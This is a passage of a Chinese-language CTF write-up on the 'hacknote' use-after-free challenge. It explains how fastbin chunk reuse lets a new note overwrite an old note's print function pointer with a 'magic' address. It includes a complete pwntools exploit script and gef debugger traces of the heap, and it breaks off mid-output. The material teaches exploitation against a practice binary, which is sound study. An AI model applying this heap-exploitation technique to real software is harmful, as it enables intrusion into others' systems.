size\u4e3a16\uff08\u5927\u5c0f\u4e0enote\u5927\u5c0f\u6240\u5728\u7684bin\u4e0d\u4e00\u6837\u5373\u53ef\uff09\n\n\n\u91ca\u653enote0\n\n\n\u91ca\u653enote1\n\n\n\u6b64\u65f6\uff0c\u5927\u5c0f\u4e3a16\u7684fast bin chunk\u4e2d\u94fe\u8868\u4e3anote1-\nnote0\n\n\n\u7533\u8bf7note2\uff0c\u5e76\u4e14\u8bbe\u7f6ereal content\u7684\u5927\u5c0f\u4e3a8\uff0c\u90a3\u4e48\u6839\u636e\u5806\u7684\u5206\u914d\u89c4\u5219\n\n\nnote2\u5176\u5b9e\u4f1a\u5206\u914dnote1\u5bf9\u5e94\u7684\u5185\u5b58\u5757\u3002\n\n\nreal content \u5bf9\u5e94\u7684chunk\u5176\u5b9e\u662fnote0\u3002\n\n\n\u5982\u679c\u6211\u4eec\u8fd9\u65f6\u5019\u5411note3\u7684chunk\u90e8\u5206\u5199\u5165magic\u7684\u5730\u5740\uff0c\u90a3\u4e48\u7531\u4e8e\u6211\u4eec\u6ca1\u6709note1\u4e3aNULL\u3002\u5f53\u6211\u4eec\u518d\u6b21\u5c1d\u8bd5\u8f93\u51fanote1\u7684\u65f6\u5019\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u8c03\u7528magic\u51fd\u6570\u3002\n\n\n\n\n\u5229\u7528\u811a\u672c\n\n\n#!/usr/bin/env python\n\n\n# -*- coding: utf-8 -*-\n\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\n\nr\n \n=\n \nprocess\n(\n./hacknote\n)\n\n\n\n\ndef\n \naddnote\n(\nsize\n,\n \ncontent\n):\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\n1\n)\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\nstr\n(\nsize\n))\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\ncontent\n)\n\n\n\n\ndef\n \ndelnote\n(\nidx\n):\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\n2\n)\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\nstr\n(\nidx\n))\n\n\n\n\ndef\n \nprintnote\n(\nidx\n):\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\n3\n)\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\nstr\n(\nidx\n))\n\n\n\n\n#gdb.attach(r)\n\n\nmagic\n \n=\n \n0x08048986\n\n\n\naddnote\n(\n32\n,\n \naaaa\n)\n \n# add note 0\n\n\naddnote\n(\n32\n,\n \nddaa\n)\n \n# add note 1\n\n\n\ndelnote\n(\n0\n)\n \n# delete note 0\n\n\ndelnote\n(\n1\n)\n \n# delete note 1\n\n\n\naddnote\n(\n8\n,\n \np32\n(\nmagic\n))\n \n# add note 2\n\n\n\nprintnote\n(\n0\n)\n \n# print note 0\n\n\n\nr\n.\ninteractive\n()\n\n\n\n\n\n\u6211\u4eec\u53ef\u4ee5\u5177\u4f53\u770b\u4e00\u4e0b\u6267\u884c\u7684\u6d41\u7a0b\uff0c\u9996\u5148\u5148\u4e0b\u65ad\u70b9\n\n\n\u4e24\u5904malloc\u4e0b\u65ad\u70b9\n\n\ngef\u27a4  b *0x0804875C\nBreakpoint \n1\n at 0x804875c\ngef\u27a4  b *0x080486CA\nBreakpoint \n2\n at 0x80486ca\n\n\n\n\n\u4e24\u5904free\u4e0b\u65ad\u70b9\n\n\ngef\u27a4  b *0x08048893\nBreakpoint \n3\n at 0x8048893\ngef\u27a4  b *0x080488A9\nBreakpoint \n4\n at 0x80488a9\n\n\n\n\n\u7136\u540e\u7ee7\u7eed\u6267\u884c\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u770b\u51fa\u7533\u8bf7note0\u65f6\uff0c\u6240\u7533\u8bf7\u5230\u7684\u5185\u5b58\u5757\u5730\u5740\u4e3a0x0804b008\u3002\uff08eax\u5b58\u50a8\u51fd\u6570\u8fd4\u56de\u503c\uff09\n\n\n$eax\n   \n:\n \n0x0804b008\n  \n\u2192\n  \n0x00000000\n\n\n$ebx\n   \n:\n \n0x00000000\n\n\n$ecx\n   \n:\n \n0xf7fac780\n  \n\u2192\n  \n0x00000000\n\n\n$edx\n   \n:\n \n0x0804b008\n  \n\u2192\n  \n0x00000000\n\n\n$esp\n   \n:\n \n0xffffcf10\n  \n\u2192\n  \n0x00000008\n\n\n$ebp\n   \n:\n \n0xffffcf48\n  \n\u2192\n  \n0xffffcf68\n  \n\u2192\n  \n0x00000000\n\n\n$esi\n   \n:\n \n0xf7fac000\n  \n\u2192\n  \n0x001b1db0\n\n\n$edi\n   \n:\n \n0xf7fac000\n  \n\u2192\n  \n0x001b1db0\n\n\n$eip\n   \n:\n \n0x080486cf\n  \n\u2192\n  \nadd_note\n+\n89\n \nadd\n \nesp\n,\n \n0x10\n\n\n$cs\n    \n:\n \n0x00000023\n\n\n$ss\n    \n:\n \n0x0000002b\n\n\n$ds\n    \n:\n \n0x0000002b\n\n\n$es\n    \n:\n \n0x0000002b\n\n\n$fs\n    \n:\n \n0x00000000\n\n\n$gs\n    \n:\n \n0x00000063\n\n\n$eflags:\n \n[\ncarry\n \nPARITY\n \nadjust\n \nzero\n \nSIGN\n \ntrap\n \nINTERRUPT\n \ndirection\n \noverflow\n \nresume\n \nvirtualx86\n \nidentification\n]\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \ncode:\ni386\n \n]\n\u2500\u2500\u2500\u2500\n\n    \n0\nx80486c2\n \nadd_note\n+\n76\n    \nadd\n    \nDWORD\n \nPTR\n \n[\neax\n],\n \neax\n\n    \n0\nx80486c4\n \nadd_note\n+\n78\n    \nadd\n    \nBYTE\n \nPTR\n \n[\nebx\n+\n0x86a0cec\n],\n \nal\n\n    \n0\nx80486ca\n \nadd_note\n+\n84\n    \ncall\n   \n0x80484e0\n \nmalloc@plt\n\n \n\u2192\n  \n0\nx80486cf\n \nadd_note\n+\n89\n    \nadd\n    \nesp\n,\n \n0x10\n\n    \n0\nx80486d2\n \nadd_note\n+\n92\n    \nmov\n    \nedx\n,\n \neax\n\n    \n0\nx80486d4\n \nadd_note\n+\n94\n    \nmov\n    \neax\n,\n \nDWORD\n \nPTR\n \n[\nebp-0x1c\n]\n\n    \n0\nx80486d7\n \nadd_note\n+\n97\n    \nmov\n    \nDWORD\n \nPTR\n \n[\neax\n*\n4\n+\n0x804a070\n],\n \nedx\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \nstack\n \n]\n\u2500\u2500\u2500\u2500\n\n\n[\n0\nxffffcf10\n,\n \nl8\n]\n\n\n8\n\n\n0\nxffffcf10\n\u2502+\n0x00\n:\n \n0x00000008\n     \n\u2190\n \n$esp\n\n\n0\nxffffcf14\n\u2502+\n0x04\n:\n \n0x00000000\n\n\n0\nxffffcf18\n\u2502+\n0x08\n:\n \n0xf7e29ef5\n  \n\u2192\n  \nstrtol\n+\n5\n \nadd\n \neax\n,\n \n0x18210b\n\n\n0\nxffffcf1c\n\u2502+\n0x0c\n:\n \n0xf7e27260\n  \n\u2192\n  \natoi\n+\n16\n \nadd\n \nesp\n,\n \n0x1c\n\n\n0\nxffffcf20\n\u2502+\n0x10\n:\n \n0xffffcf58\n  \n\u2192\n  \n0xffff0a31\n  \n\u2192\n  \n0x00000000\n\n\n0\nxffffcf24\n\u2502+\n0x14\n:\n \n0x00000000\n\n\n0\nxffffcf28\n\u2502+\n0x18\n:\n \n0x0000000a\n\n\n0\nxffffcf2c\n\u2502+\n0x1c\n:\n \n0x00000000\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \ntrace\n \n]\n\u2500\u2500\u2500\u2500\n\n\n---\nType\n \nreturn\n \nto\n \ncontinue\n,\n \nor\n \nq\n \nreturn\n \nto\n \nquit---\n\n\n[\n#0] 0x80486cf \u2192 Name: add_note()\n\n\n[\n#1] 0x8048ac5 \u2192 Name: main()\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n\ngef\n\u27a4\n  \nheap\n \nchunk\n \n0x0804b008\n\n\nUsedChunk\n(\naddr\n=\n0x804b008\n,\n \nsize\n=\n0x10\n)\n\n\nChunk\n \nsize\n:\n \n16\n \n(\n0x10\n)\n\n\nUsable\n \nsize\n:\n \n12\n \n(\n0xc\n)\n\n\nPrevious\n \nchunk\n \nsize\n:\n \n0\n \n(\n0x0\n)\n\n\nPREV_INUSE\n \nflag\n:\n \nOn\n\n\nIS_MMAPPED\n \nflag\n:\n \nOff\n\n\nNON_MAIN_ARENA\n \nflag\n:\n \nOff\n\n\n\n\n\n\u7533\u8bf7note 0\u7684content\u7684\u5730\u5740\u4e3a0x0804b018\n\n\n$eax\n   \n:\n \n0x0804b018\n  \n\u2192\n  \n0x00000000\n\n\n$ebx\n   \n:\n \n0x0804b008\n  \n\u2192\n  \n0x0804865b\n  \n\u2192\n  \nprint_note_content\n+\n0\n \npush\n \nebp\n\n\n$ecx\n   \n:\n \n0xf7fac780\n  \n\u2192\n  \n0x00000000\n\n\n$edx\n   \n:\n \n0x0804b018\n  \n\u2192\n  \n0x00000000\n\n\n$esp\n   \n:\n \n0xffffcf10\n  \n\u2192\n  \n0x00000020\n\n\n$ebp\n   \n:\n \n0xffffcf48\n  \n\u2192\n  \n0xffffcf68\n  \n\u2192\n  \n0x00000000\n\n\n$esi\n   \n:\n \n0xf7fac000\n  \n\u2192\n  \n0x001b1db0\n\n\n$edi\n   \n:\n \n0xf7fac000\n  \n\u2192\n  \n0x001b1db0\n\n\n$eip\n   \n:\n \n0x08048761\n  \n\u2192\n  \nadd_note\n+\n235\n \nadd\n \nesp\n,\n \n0x10\n\n\n$cs\n    \n:\n \n0x00000023\n\n\n$ss\n    \n:\n \n0x0000002b\n\n\n$ds\n    \n:\n \n0x0000002b\n\n\n$es\n    \n:\n \n0x0000002b\n\n\n$fs\n    \n:\n \n0x00000000\n\n\n$gs\n    \n:\n \n0x00000063\n\n\n$eflags:\n \n[\ncarry\n \nPARITY\n \nadjust\n \nZERO\n \nsign\n \ntrap\n \nINTERRUPT\n \ndirection\n \noverflow\n \nresume\n \nvirtualx86\n \nidentification\n]\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \ncode:\ni386\n \n]\n\u2500\u2500\u2500\u2500\n\n    \n0\nx8048752\n \nadd_note\n+\n220\n   \nmov\n    \nal\n,\n \nds\n:\n0x458b0804\n\n    \n0\nx8048757\n \nadd_note\n+\n225\n   \ncall\n   \n0x581173df\n\n    \n0\nx804875c\n \nadd_note\n+\n230\n   \ncall\n   \n0x80484e0\n \nmalloc@plt\n\n \n\u2192\n  \n0\nx8048761\n \nadd_note\n+\n235\n   \nadd\n    \nesp\n,\n \n0x10\n\n    \n0\nx8048764\n \nadd_note\n+\n238\n   \nmov\n    \nDWORD\n \nPTR\n \n[\nebx\n+\n0x4\n],\n \neax\n\n    \n0\nx8048767\n \nadd_note\n+\n241\n   \nmov\n    \neax\n,\n \nDWORD\n \nPTR\n \n[\nebp-0x1c\n]\n\n    \n0\nx804876a\n \nadd_note\n+\n244\n   \nmov\n    \neax\n,\n \nDWORD\n \nPTR\n \n[\neax\n*\n4\n+\n0x804a070\n]\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \nstack\n \n]\n\u2500\u2500\u2500\u2500\n\n\n[\n0\nxffffcf10\n,\n \nl8\n]\n\n\n8\n\n\n0\nxffffcf10\n\u2502+\n0x00\n:\n \n0x00000020\n     \n\u2190\n \n$esp\n\n\n0\nxffffcf14\n\u2502+\n0x04\n:\n \n0xffffcf34\n  \n\u2192\n  \n0xf70a3233\n\n\n0\nxffffcf18\n\u2502+\n0x08\n:\n \n0x00000008\n\n\n0\nxffffcf1c\n\u2502+\n0x0c\n:\n \n0xf7e27260\n  \n\u2192\n  \natoi\n+\n16\n \nadd\n \nesp\n,\n \n0x1c\n\n\n0\nxffffcf20\n\u2502+\n0x10\n:\n \n0xffffcf58\n  \n\u2192\n  \n0xffff0a31\n  \n\u2192\n  \n0x00000000\n\n\n0\nxffffcf24\n\u2502+\n0x14\n:\n \n0x00000000\n\n\n0\nxffffcf28\n\u2502+\n0x18\n:\n \n0x0000000a\n\n\n0\nxffffcf2c\n\u2502+\n0x1c\n:\n \n0x00000000\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \ntrace\n \n]\n\u2500\u2500\u2500\u2500\n\n\n---\nType\n \nreturn\n \nto\n \ncontinue\n,\n \nor\n \nq\n \nreturn\n \nto\n \nquit---\n\n\n[\n#0] 0x8048761 \u2192 Name: add_note()\n\n\n[\n#1] 0x8048ac5 \u2192 Name: main()\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n\ngef\n\u27a4\n  \nheap\n \nchunk\n \n0x0804b018\n\n\nUsedChunk\n(\naddr\n=\n0x804b018\n,\n \nsize\n=\n0x28\n)\n\n\nChunk\n \nsize\n:\n \n40\n \n(\n0x28\n)\n\n\nUsable\n \nsize\n:\n \n36\n \n(\n0x24\n)\n\n\nPrevious\n \nchunk\n \nsize\n:\n \n0\n \n(\n0x0\n)\n\n\nPREV_INUSE\n \nflag\n:\n \nOn\n\n\nIS_MMAPPED\n \nflag\n:\n \nOff\n\n\nNON_MAIN_ARENA\n \nflag\n:\n \nOff\n\n\n\n\n\n\u7c7b\u4f3c\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230note1\u7684\u5730\u5740\u4ee5\u53ca\u5176content\u7684\u5730\u5740\u5206\u522b\u4e3a0x0804b040 \u548c0x0804b050\u3002\n\n\n\u540c\u65f6\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u770b\u5230note0\u4e0enote1\u5bf9\u5e94\u7684content\u786e\u5b9e\u662f\u76f8\u5e94\u7684\u5185\u5b58\u5757\u3002\n\n\ngef\n\u27a4\n  \ngrep\n \naaaa\n\n\n[+]\n \nSearching\n \naaaa\n \nin\n \nmemory\n\n\n[+]\n \nIn\n \n[\nheap\n]\n(\n0x804b000\n-\n0x806c000\n),\n \npermission\n=\nrw-\n\n  \n0\nx804b018\n \n-\n \n0x804b01c\n  \n\u2192\n   \naaaa\n \n\ngef\n\u27a4\n  \ngrep\n \nddaa\n\n\n[+]\n \nSearching\n \nddaa\n \nin\n \nmemory\n\n\n[+]\n \nIn\n \n[\nheap\n]\n(\n0x804b000\n-\n0x806c000\n),\n \npermission\n=\nrw-\n\n  \n0\nx804b050\n \n-\n \n0x804b054\n  \n\u2192\n   \nddaa\n \n\n\n\n\n\u4e0b\u9762\u5c31\u662ffree\u7684\u8fc7\u7a0b\u4e86\u3002\u6211\u4eec\u53ef\u4ee5\u4f9d\u6b21\u53d1\u73b0\u9996\u5148\uff0cnote0\u7684content\u88abfree\n\n\n \n\u2192\n  \n0\nx8048893\n \ndel_note\n+\n143\n   \ncall\n   \n0x80484c0\n \nfree@plt\n\n   \n\u21b3\n   \n0\nx80484c0\n \nfree@plt\n+\n0\n     \njmp\n    \nDWORD\n \nPTR\n \nds\n:\n0x804a018\n\n       \n0\nx80484c6\n \nfree@plt\n+\n6\n     \npush\n   \n0x18\n\n       \n0\nx80484cb\n \nfree@plt\n+\n11\n    \njmp\n    \n0x8048480\n\n       \n0\nx80484d0\n \n__stack_chk_fail@plt\n+\n0\n \njmp\n    \nDWORD\n \nPTR\n \nds\n:\n0x804a01c\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \nstack\n \n]\n\u2500\u2500\u2500\u2500\n\n\n[\n0\nxffffcf20\n,\n \nl8\n]\n\n\n8\n\n\n0\nxffffcf20\n\u2502+\n0x00\n:\n \n0x0804b018\n  \n\u2192\n  \naaaa\n  \n\u2190\n \n$esp\n\n\n\n\n\n\u7136\u540e\u662fnote0\u672c\u8eab\n\n\n \n\u2192\n  \n0\nx80488a9\n \ndel_note\n+\n165\n   \ncall\n   \n0x80484c0\n \nfree@plt\n\n   \n\u21b3\n   \n0\nx80484c0\n \nfree@plt\n+\n0\n     \njmp\n    \nDWORD\n \nPTR\n \nds\n:\n0x804a018\n\n       \n0\nx80484c6\n \nfree@plt\n+\n6\n     \npush\n   \n0x18\n\n       \n0\nx80484cb\n \nfree@plt\n+\n11\n    \njmp\n    \n0x8048480\n\n       \n0\nx80484d0\n \n__stack_chk_fail@plt\n+\n0\n \njmp\n    \nDWORD\n \nPTR\n \nds\n:\n0x804a01c\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \nstack\n \n]\n\u2500\u2500\u2500\u2500\n\n\n[\n0\nxffffcf20\n,\n \nl8\n]\n\n\n8\n\n\n0\nxffffcf20\n\u2502+\n0x00\n:\n \n0x0804b008\n  \n\u2192\n  \n0x0804865b\n  \n\u2192\n  \nprint_note_content\n+\n0\n \npush\n \nebp\n  \n\u2190\n \n$esp\n\n\n\n\n\n\u5f53delete\u7ed3\u675f\u540e\uff0c\u6211\u4eec\u89c2\u770b\u4e00\u4e0bbins\uff0c\u53ef\u4ee5\u53d1\u73b0\uff0c\u786e\u5b9e\u5176\u88ab\u5b58\u653e\u5728\u5bf9\u5e94\u7684fast bin\u4e2d\uff0c\n\n\ngef\n\u27a4\n  \nheap\n \nbins\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n \nFastbins\n \nfor\n \narena\n \n0xf7fac780\n \n]\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n\nFastbins\n[\nidx\n=\n0\n,\n \nsize\n=\n0x8\n]\n  \n\u2190\n  \nUsedChunk\n(\naddr\n=\n0x804b008\n,\n \nsize\n=\n0x10\n)\n \n\nFastbins\n[\nidx\n=\n1\n,\n \nsize\n=\n0xc\n]\n \n0x00\n\n\nFastbins\n[\nidx\n=\n2\n,\n \nsize\n=\n0x10\n]\n \n0x00\n\n\nFastbins\n[\nidx\n=\n3\n,\n \nsize\n=\n0x14\n]\n  \n\u2190\n  \nUsedChunk\n(\naddr\n=\n0x804b018\n,\n \nsize\n=\n0x28\n)\n \n\nFastbins\n[\nidx\n=\n4\n,\n \nsize\n=\n0x18\n]\n 